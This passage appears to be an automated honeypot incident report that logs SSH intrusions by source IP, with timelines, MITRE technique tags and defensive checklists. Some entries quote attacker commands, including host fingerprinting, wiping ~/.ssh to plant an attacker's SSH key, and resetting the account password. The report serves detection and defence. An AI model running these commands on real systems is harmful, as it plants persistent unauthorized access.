**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:29:26` | `cowrie.session.connect` |
| `2026-07-04 05:29:26` | `cowrie.client.version` |
| `2026-07-04 05:29:26` | `cowrie.client.kex` |
| `2026-07-04 05:29:27` | `cowrie.login.success` |
| `2026-07-04 05:29:28` | `cowrie.session.params` |
| `2026-07-04 05:29:28` | `cowrie.command.input` |
| `2026-07-04 05:29:28` | `cowrie.command.failed` |
| `2026-07-04 05:29:28` | `cowrie.log.closed` |
| `2026-07-04 05:29:29` | `cowrie.session.params` |
| `2026-07-04 05:29:29` | `cowrie.command.input` |
| `2026-07-04 05:29:29` | `cowrie.session.file_download` |
| `2026-07-04 05:29:29` | `cowrie.log.closed` |
| `2026-07-04 05:29:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.61[.]170` to AbuseIPDB if not already reported
- [ ] Block `118.193.61[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b38209cd1533

| Field | Detail |
|---|---|
| **Source IP** | `118.193.61[.]170` |
| **First Seen** | 2026-07-04 05:29 |
| **Last Seen** | 2026-07-04 05:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:29:30` | `cowrie.session.connect` |
| `2026-07-04 05:29:30` | `cowrie.client.version` |
| `2026-07-04 05:29:30` | `cowrie.client.kex` |
| `2026-07-04 05:29:30` | `cowrie.login.success` |
| `2026-07-04 05:29:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.61[.]170` to AbuseIPDB if not already reported
- [ ] Block `118.193.61[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc2f76f1dd04

| Field | Detail |
|---|---|
| **Source IP** | `118.193.61[.]170` |
| **First Seen** | 2026-07-04 05:29 |
| **Last Seen** | 2026-07-04 05:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:29:31` | `cowrie.session.connect` |
| `2026-07-04 05:29:31` | `cowrie.client.version` |
| `2026-07-04 05:29:31` | `cowrie.client.kex` |
| `2026-07-04 05:29:32` | `cowrie.login.success` |
| `2026-07-04 05:29:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.61[.]170` to AbuseIPDB if not already reported
- [ ] Block `118.193.61[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6b1cfff7f3a

| Field | Detail |
|---|---|
| **Source IP** | `154.90.70[.]254` |
| **First Seen** | 2026-07-04 05:32 |
| **Last Seen** | 2026-07-04 05:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:32:08` | `cowrie.session.connect` |
| `2026-07-04 05:32:08` | `cowrie.client.version` |
| `2026-07-04 05:32:09` | `cowrie.client.kex` |
| `2026-07-04 05:32:09` | `cowrie.login.success` |
| `2026-07-04 05:32:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.90.70[.]254` to AbuseIPDB if not already reported
- [ ] Block `154.90.70[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a70bd6c48f27

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 05:32 |
| **Last Seen** | 2026-07-04 05:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:32:17` | `cowrie.session.connect` |
| `2026-07-04 05:32:17` | `cowrie.client.version` |
| `2026-07-04 05:32:17` | `cowrie.client.kex` |
| `2026-07-04 05:32:17` | `cowrie.login.success` |
| `2026-07-04 05:32:18` | `cowrie.session.params` |
| `2026-07-04 05:32:18` | `cowrie.command.input` |
| `2026-07-04 05:32:18` | `cowrie.command.input` |
| `2026-07-04 05:32:18` | `cowrie.command.input` |
| `2026-07-04 05:32:18` | `cowrie.command.input` |
| `2026-07-04 05:32:18` | `cowrie.command.input` |
| `2026-07-04 05:32:18` | `cowrie.command.success` |
| `2026-07-04 05:32:18` | `cowrie.command.input` |
| `2026-07-04 05:32:18` | `cowrie.command.input` |
| `2026-07-04 05:32:18` | `cowrie.command.input` |
| `2026-07-04 05:32:18` | `cowrie.command.input` |
| `2026-07-04 05:32:18` | `cowrie.log.closed` |
| `2026-07-04 05:32:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74c960b30996

| Field | Detail |
|---|---|
| **Source IP** | `103.237.144[.]204` |
| **First Seen** | 2026-07-04 05:32 |
| **Last Seen** | 2026-07-04 05:33 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:32:52` | `cowrie.session.connect` |
| `2026-07-04 05:32:52` | `cowrie.client.version` |
| `2026-07-04 05:32:52` | `cowrie.client.kex` |
| `2026-07-04 05:32:53` | `cowrie.login.success` |
| `2026-07-04 05:32:55` | `cowrie.session.params` |
| `2026-07-04 05:32:55` | `cowrie.command.input` |
| `2026-07-04 05:32:56` | `cowrie.command.failed` |
| `2026-07-04 05:32:56` | `cowrie.log.closed` |
| `2026-07-04 05:32:58` | `cowrie.session.params` |
| `2026-07-04 05:32:58` | `cowrie.command.input` |
| `2026-07-04 05:32:58` | `cowrie.session.file_download` |
| `2026-07-04 05:32:58` | `cowrie.log.closed` |
| `2026-07-04 05:33:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.237.144[.]204` to AbuseIPDB if not already reported
- [ ] Block `103.237.144[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc1910db88cf

| Field | Detail |
|---|---|
| **Source IP** | `103.237.144[.]204` |
| **First Seen** | 2026-07-04 05:32 |
| **Last Seen** | 2026-07-04 05:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:32:59` | `cowrie.session.connect` |
| `2026-07-04 05:32:59` | `cowrie.client.version` |
| `2026-07-04 05:32:59` | `cowrie.client.kex` |
| `2026-07-04 05:33:00` | `cowrie.login.success` |
| `2026-07-04 05:33:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.237.144[.]204` to AbuseIPDB if not already reported
- [ ] Block `103.237.144[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71114be042f9

| Field | Detail |
|---|---|
| **Source IP** | `103.237.144[.]204` |
| **First Seen** | 2026-07-04 05:33 |
| **Last Seen** | 2026-07-04 05:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:33:01` | `cowrie.session.connect` |
| `2026-07-04 05:33:01` | `cowrie.client.version` |
| `2026-07-04 05:33:01` | `cowrie.client.kex` |
| `2026-07-04 05:33:02` | `cowrie.login.success` |
| `2026-07-04 05:33:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.237.144[.]204` to AbuseIPDB if not already reported
- [ ] Block `103.237.144[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1865b01811f1

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 05:33 |
| **Last Seen** | 2026-07-04 05:33 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:33:27` | `cowrie.session.connect` |
| `2026-07-04 05:33:28` | `cowrie.client.version` |
| `2026-07-04 05:33:28` | `cowrie.client.kex` |
| `2026-07-04 05:33:34` | `cowrie.login.success` |
| `2026-07-04 05:33:38` | `cowrie.session.params` |
| `2026-07-04 05:33:38` | `cowrie.command.input` |
| `2026-07-04 05:33:39` | `cowrie.log.closed` |
| `2026-07-04 05:33:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53f7e0aa44b4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 05:34 |
| **Last Seen** | 2026-07-04 05:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:34:58` | `cowrie.session.connect` |
| `2026-07-04 05:34:58` | `cowrie.client.version` |
| `2026-07-04 05:34:58` | `cowrie.client.kex` |
| `2026-07-04 05:34:58` | `cowrie.login.success` |
| `2026-07-04 05:34:59` | `cowrie.session.params` |
| `2026-07-04 05:34:59` | `cowrie.command.input` |
| `2026-07-04 05:34:59` | `cowrie.command.input` |
| `2026-07-04 05:34:59` | `cowrie.command.input` |
| `2026-07-04 05:34:59` | `cowrie.command.input` |
| `2026-07-04 05:34:59` | `cowrie.command.input` |
| `2026-07-04 05:34:59` | `cowrie.command.success` |
| `2026-07-04 05:34:59` | `cowrie.command.input` |
| `2026-07-04 05:34:59` | `cowrie.command.input` |
| `2026-07-04 05:34:59` | `cowrie.command.input` |
| `2026-07-04 05:34:59` | `cowrie.command.input` |
| `2026-07-04 05:34:59` | `cowrie.log.closed` |
| `2026-07-04 05:34:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f8baf61a9ed

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 05:36 |
| **Last Seen** | 2026-07-04 05:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:36:09` | `cowrie.session.connect` |
| `2026-07-04 05:36:09` | `cowrie.client.version` |
| `2026-07-04 05:36:09` | `cowrie.client.kex` |
| `2026-07-04 05:36:09` | `cowrie.login.success` |
| `2026-07-04 05:36:10` | `cowrie.session.params` |
| `2026-07-04 05:36:10` | `cowrie.command.input` |
| `2026-07-04 05:36:10` | `cowrie.command.input` |
| `2026-07-04 05:36:10` | `cowrie.command.input` |
| `2026-07-04 05:36:10` | `cowrie.command.input` |
| `2026-07-04 05:36:10` | `cowrie.command.input` |
| `2026-07-04 05:36:10` | `cowrie.command.success` |
| `2026-07-04 05:36:10` | `cowrie.command.input` |
| `2026-07-04 05:36:10` | `cowrie.command.input` |
| `2026-07-04 05:36:10` | `cowrie.command.input` |
| `2026-07-04 05:36:10` | `cowrie.command.input` |
| `2026-07-04 05:36:10` | `cowrie.log.closed` |
| `2026-07-04 05:36:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c46b0f43882

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-04 05:36 |
| **Last Seen** | 2026-07-04 05:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:36:58` | `cowrie.session.connect` |
| `2026-07-04 05:36:58` | `cowrie.client.version` |
| `2026-07-04 05:36:58` | `cowrie.client.kex` |
| `2026-07-04 05:36:58` | `cowrie.login.success` |
| `2026-07-04 05:36:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3968f92c8e47

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-04 05:36 |
| **Last Seen** | 2026-07-04 05:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:36:58` | `cowrie.session.connect` |
| `2026-07-04 05:36:58` | `cowrie.client.version` |
| `2026-07-04 05:36:58` | `cowrie.client.kex` |
| `2026-07-04 05:36:58` | `cowrie.login.success` |
| `2026-07-04 05:36:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4428d33145cc

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-04 05:37 |
| **Last Seen** | 2026-07-04 05:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:37:04` | `cowrie.session.connect` |
| `2026-07-04 05:37:04` | `cowrie.client.version` |
| `2026-07-04 05:37:04` | `cowrie.client.kex` |
| `2026-07-04 05:37:04` | `cowrie.login.success` |
| `2026-07-04 05:37:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b270169d9fd9

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-04 05:37 |
| **Last Seen** | 2026-07-04 05:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:37:04` | `cowrie.session.connect` |
| `2026-07-04 05:37:04` | `cowrie.client.version` |
| `2026-07-04 05:37:04` | `cowrie.client.kex` |
| `2026-07-04 05:37:04` | `cowrie.login.success` |
| `2026-07-04 05:37:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f296329c586

| Field | Detail |
|---|---|
| **Source IP** | `58.56.200[.]238` |
| **First Seen** | 2026-07-04 05:37 |
| **Last Seen** | 2026-07-04 05:38 |
| **Session Duration** | 55s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo -e "office1\nV0Vt17L8VkFa\nV0Vt17L8VkFa"|passwd|bash, Enter new UNIX password: ` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:37:40` | `cowrie.session.connect` |
| `2026-07-04 05:37:41` | `cowrie.client.version` |
| `2026-07-04 05:37:41` | `cowrie.client.kex` |
| `2026-07-04 05:37:42` | `cowrie.login.success` |
| `2026-07-04 05:37:43` | `cowrie.session.params` |
| `2026-07-04 05:37:43` | `cowrie.command.input` |
| `2026-07-04 05:37:43` | `cowrie.command.failed` |
| `2026-07-04 05:37:44` | `cowrie.log.closed` |
| `2026-07-04 05:37:45` | `cowrie.session.params` |
| `2026-07-04 05:37:45` | `cowrie.command.input` |
| `2026-07-04 05:37:45` | `cowrie.session.file_download` |
| `2026-07-04 05:37:45` | `cowrie.log.closed` |
| `2026-07-04 05:38:15` | `cowrie.session.params` |
| `2026-07-04 05:38:15` | `cowrie.command.input` |
| `2026-07-04 05:38:15` | `cowrie.log.closed` |
| `2026-07-04 05:38:16` | `cowrie.session.params` |
| `2026-07-04 05:38:16` | `cowrie.command.input` |
| `2026-07-04 05:38:16` | `cowrie.command.input` |
| `2026-07-04 05:38:16` | `cowrie.command.failed` |
| `2026-07-04 05:38:16` | `cowrie.log.closed` |
| `2026-07-04 05:38:17` | `cowrie.session.params` |
| `2026-07-04 05:38:17` | `cowrie.command.input` |
| `2026-07-04 05:38:17` | `cowrie.log.closed` |
| `2026-07-04 05:38:18` | `cowrie.session.params` |
| `2026-07-04 05:38:18` | `cowrie.command.input` |
| `2026-07-04 05:38:19` | `cowrie.log.closed` |
| `2026-07-04 05:38:20` | `cowrie.session.params` |
| `2026-07-04 05:38:20` | `cowrie.command.input` |
| `2026-07-04 05:38:20` | `cowrie.log.closed` |
| `2026-07-04 05:38:21` | `cowrie.session.params` |
| `2026-07-04 05:38:21` | `cowrie.command.input` |
| `2026-07-04 05:38:21` | `cowrie.command.input` |
| `2026-07-04 05:38:21` | `cowrie.log.closed` |
| `2026-07-04 05:38:22` | `cowrie.session.params` |
| `2026-07-04 05:38:22` | `cowrie.command.input` |
| `2026-07-04 05:38:23` | `cowrie.log.closed` |
| `2026-07-04 05:38:23` | `cowrie.session.params` |
| `2026-07-04 05:38:23` | `cowrie.command.input` |
| `2026-07-04 05:38:24` | `cowrie.log.closed` |
| `2026-07-04 05:38:25` | `cowrie.session.params` |
| `2026-07-04 05:38:25` | `cowrie.command.input` |
| `2026-07-04 05:38:25` | `cowrie.log.closed` |
| `2026-07-04 05:38:26` | `cowrie.session.params` |
| `2026-07-04 05:38:26` | `cowrie.command.input` |
| `2026-07-04 05:38:26` | `cowrie.log.closed` |
| `2026-07-04 05:38:27` | `cowrie.session.params` |
| `2026-07-04 05:38:27` | `cowrie.command.input` |
| `2026-07-04 05:38:28` | `cowrie.log.closed` |
| `2026-07-04 05:38:28` | `cowrie.session.params` |
| `2026-07-04 05:38:28` | `cowrie.command.input` |
| `2026-07-04 05:38:29` | `cowrie.log.closed` |
| `2026-07-04 05:38:30` | `cowrie.session.params` |
| `2026-07-04 05:38:30` | `cowrie.command.input` |
| `2026-07-04 05:38:31` | `cowrie.log.closed` |
| `2026-07-04 05:38:31` | `cowrie.session.params` |
| `2026-07-04 05:38:31` | `cowrie.command.input` |
| `2026-07-04 05:38:32` | `cowrie.log.closed` |
| `2026-07-04 05:38:33` | `cowrie.session.params` |
| `2026-07-04 05:38:33` | `cowrie.command.input` |
| `2026-07-04 05:38:33` | `cowrie.log.closed` |
| `2026-07-04 05:38:35` | `cowrie.session.params` |
| `2026-07-04 05:38:35` | `cowrie.command.input` |
| `2026-07-04 05:38:35` | `cowrie.log.closed` |
| `2026-07-04 05:38:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.56.200[.]238` to AbuseIPDB if not already reported
- [ ] Block `58.56.200[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f1f72109151

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 05:39 |
| **Last Seen** | 2026-07-04 05:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:39:41` | `cowrie.session.connect` |
| `2026-07-04 05:39:41` | `cowrie.client.version` |
| `2026-07-04 05:39:41` | `cowrie.client.kex` |
| `2026-07-04 05:39:41` | `cowrie.login.success` |
| `2026-07-04 05:39:42` | `cowrie.session.params` |
| `2026-07-04 05:39:42` | `cowrie.command.input` |
| `2026-07-04 05:39:42` | `cowrie.command.input` |
| `2026-07-04 05:39:42` | `cowrie.command.input` |
| `2026-07-04 05:39:42` | `cowrie.command.input` |
| `2026-07-04 05:39:42` | `cowrie.command.input` |
| `2026-07-04 05:39:42` | `cowrie.command.success` |
| `2026-07-04 05:39:42` | `cowrie.command.input` |
| `2026-07-04 05:39:42` | `cowrie.command.input` |
| `2026-07-04 05:39:42` | `cowrie.command.input` |
| `2026-07-04 05:39:42` | `cowrie.command.input` |
| `2026-07-04 05:39:42` | `cowrie.log.closed` |
| `2026-07-04 05:39:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebca28d11964

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 05:41 |
| **Last Seen** | 2026-07-04 05:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:41:24` | `cowrie.session.connect` |
| `2026-07-04 05:41:24` | `cowrie.client.version` |
| `2026-07-04 05:41:24` | `cowrie.client.kex` |
